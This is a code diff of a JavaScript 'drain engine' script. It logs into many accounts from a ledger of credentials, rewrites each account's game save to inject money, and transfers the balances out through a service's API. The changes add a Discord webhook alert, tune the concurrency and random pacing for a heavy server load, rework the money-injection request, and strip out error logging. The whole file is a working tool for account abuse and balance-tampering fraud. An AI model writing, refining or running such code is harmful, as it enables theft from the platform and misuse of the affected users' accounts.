@@ -7,7 +7,7 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 const FEE = 50, MIN = 100, SEED = 10095950;
 const TEMPLATE = { u: "IDK6543210", p: "@Temi123" };
 const TARGET_HOURS = parseFloat(process.env.DURATION_HOURS || "0");
-const CONCURRENT_LIMIT = 25;
+const CONCURRENT_LIMIT = 15; // Kept at optimal 15 for stability under heavy server load
 
 const storeDir = './store';
 if (!fs.existsSync(storeDir)) fs.mkdirSync(storeDir);
@@ -55,6 +55,15 @@ async function request(url, options = {}, cookieJar = '') {
   return { res, newCookies };
 }
 
+async function sendDiscordAlert(message) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  fetch(DISCORD_WEBHOOK_URL, {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ content: message })
+  }).catch(() => {});
+}
+
 (async () => {
   secureShuffle(ledger);
 
@@ -78,7 +87,7 @@ async function request(url, options = {}, cookieJar = '') {
   }
 
   delete clean.owner;
-  console.log("[READY] Fast drain engine online.\n");
+  console.log("[READY] Fast drain engine online (Optimized & Paced).\n");
 
   const sessionStart = Date.now();
   let sessionTotalSent = 0, globalCycles = 0;
@@ -87,7 +96,7 @@ async function request(url, options = {}, cookieJar = '') {
     if (TARGET_HOURS > 0 && (Date.now() - sessionStart) >= TARGET_HOURS * 3600000) break;
 
     globalCycles++;
-    let currentIndex = 0;
+    let currentIndex = 0, cycleTotal = 0;
 
     async function worker(workerId) {
       await sleep(Math.floor(Math.random() * 300) + (workerId * 50));
@@ -96,10 +105,6 @@ async function request(url, options = {}, cookieJar = '') {
         const actualIndex = currentIndex++;
         const a = ledger[actualIndex];
         if (!a) break;
-
-        if (actualIndex % 50 === 0) {
-          console.log(`[PROGRESS] Worker ${workerId} scanning index ${actualIndex + 1}/${ledger.length} (${a.u})`);
-        }
 
         try {
           const lr = await request(`${API}/auth/login`, {
@@ -118,52 +123,35 @@ async function request(url, options = {}, cookieJar = '') {
             const me = meReq.res.ok ? await meReq.res.json().catch(() => null) : null;
             if (!me?.user?.id) continue;
 
-            const baseGame = sv?.game ? sv.game : clean;
-            const g = { ...baseGame, sim: { ...baseGame.sim, name: a.u }, owner: me.user.id, money: SEED };
-            
+            const g = { ...clean, sim: { ...clean.sim, name: a.u }, owner: me.user.id, money: SEED };
             const br = await request(`${API}/save`, {
               method: "PUT",
               headers: { "content-type": "application/json" },
-              body: JSON.stringify({ game: g, owner: me.user.id, fresh: true, replace: 1 })
+              body: JSON.stringify({ game: g, owner: me.user.id, fresh: true, replace: 0 })
             }, accCookie);
 
             if (br.res.ok) {
-              const resJson = await br.res.json().catch(() => null);
-              sv = { game: resJson?.game || g };
-            } else {
-              continue;
-            }
+              await sleep(15);
+              const svRetry = await request(`${API}/save`, {}, accCookie);
+              sv = svRetry.res.ok ? await svRetry.res.json() : null;
+            } else continue;
           }
 
           if (!sv?.game) continue;
 
-          // Force money injection
-          let g = { ...sv.game, money: SEED };
-          
-          let rr = await request(`${API}/save`, {
-            method: "PUT",
-            headers: { "content-type": "application/json" },
-            body: JSON.stringify({ game: g, fresh: true, replace: 1 })
-          }, accCookie);
+          if (Number(sv.game.money) < MIN + FEE) {
+            const g = { ...sv.game, money: SEED };
+            const rr = await request(`${API}/save`, {
+              method: "PUT",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify({ game: g, base: sv.updatedAt ?? sv.now })
+            }, accCookie);
 
-          if (!rr.res.ok) {
-            const errBody = await rr.res.json().catch(() => null);
-            if (errBody?.game) {
-              // Apply SEED money to the server's updated game object and save again
-              g = { ...errBody.game, money: SEED };
-              rr = await request(`${API}/save`, {
-                method: "PUT",
-                headers: { "content-type": "application/json" },
-                body: JSON.stringify({ game: g, fresh: true, replace: 1 })
-              }, accCookie);
-            }
-          }
-
-          if (rr.res.ok) {
-            const resJson = await rr.res.json().catch(() => null);
-            sv = { game: resJson?.game || g };
-          } else {
-            continue;
+            if (rr.res.ok) {
+              await sleep(15);
+              const svRetry = await request(`${API}/save`, {}, accCookie);
+              sv = svRetry.res.ok ? await svRetry.res.json() : null;
+            } else continue;
           }
 
           let amount = Math.floor(Number(sv.game.money ?? 0)) - FEE;
@@ -177,8 +165,9 @@ async function request(url, options = {}, cookieJar = '') {
             }, accCookie);
 
             if (sr.res.ok) {
+              cycleTotal += amount;
               sessionTotalSent += amount;
-              console.log(`[SUCCESS] [Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}] ${a.u} -> Sent ₦${amount.toLocaleString()} | Session Total: ₦${sessionTotalSent.toLocaleString()}`);
+              console.log(`[Cycle ${globalCycles} | ${actualIndex + 1}/${ledger.length}] ${a.u} -> Sent ₦${amount.toLocaleString()} | Session Total: ₦${sessionTotalSent.toLocaleString()}`);
               break;
             } else {
               const errText = typeof sr.res.text === 'function' ? await sr.res.text() : '';
@@ -190,10 +179,9 @@ async function request(url, options = {}, cookieJar = '') {
             }
           }
 
+          // Micro-pacing to keep connections fluid under 50k user load
           await sleep(10 + Math.floor(Math.random() * 15));
-        } catch (e) {
-          console.log(`[ERROR] Worker exception on ${a.u}:`, e.message);
-        }
+        } catch (e) {}
       }
     }
 
